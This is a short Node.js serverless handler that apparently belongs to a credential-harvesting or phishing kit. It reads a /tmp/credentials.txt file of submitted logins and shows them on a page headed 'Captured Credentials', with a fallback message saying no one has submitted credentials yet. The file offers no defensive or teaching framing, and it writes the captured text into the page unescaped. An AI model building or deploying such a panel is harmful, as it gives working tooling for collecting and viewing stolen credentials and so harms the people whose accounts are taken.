const fs = require('fs');
const path = require('path');

module.exports = async (req, res) => {
    const filePath = path.join('/tmp', 'credentials.txt');

    // Check if the file exists
    if (!fs.existsSync(filePath)) {
        return res.send('<h2>No credentials found.</h2><p>No one has submitted credentials yet.</p>');
    }

    // Read and display the contents of the file
    const credentials = fs.readFileSync(filePath, 'utf-8');
    res.send(`<h2>Captured Credentials</h2><pre>${credentials}</pre>`);
};